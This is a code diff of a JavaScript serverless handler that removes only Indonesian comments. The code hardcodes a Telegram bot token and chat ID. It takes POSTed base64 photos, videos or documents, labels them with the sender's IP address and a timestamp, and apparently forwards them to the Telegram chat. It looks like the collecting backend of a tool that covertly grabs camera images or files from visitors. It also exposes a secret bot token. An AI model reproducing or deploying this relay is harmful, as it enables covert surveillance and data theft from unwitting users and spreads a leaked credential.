@@ -2,7 +2,6 @@ const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
 const CHAT_ID = "6126622503";
 
 export default async function handler(req, res) {
-    // GET untuk pesan
     if (req.method === 'GET' && req.query.msg) {
         try {
             const text = decodeURIComponent(req.query.msg);
@@ -16,7 +15,6 @@ export default async function handler(req, res) {
         return;
     }
 
-    // POST
     if (req.method === 'POST') {
         try {
             const { img, video, ts, filename, type } = req.body;
@@ -24,7 +22,6 @@ export default async function handler(req, res) {
             const ua = req.headers['user-agent'] || 'unknown';
             const caption = `📸 ${type || 'media'} | IP: ${ip} | ${new Date(ts).toISOString()}`;
 
-            // Kirim dokumen (ZIP, video, dll)
             if ((type === 'document' || type === 'video') && video) {
                 const buf = Buffer.from(video, 'base64');
                 const formData = new FormData();
@@ -42,7 +39,6 @@ export default async function handler(req, res) {
                 return;
             }
 
-            // Kirim foto
             if (img) {
                 const buf = Buffer.from(img, 'base64');
                 const formData = new FormData();
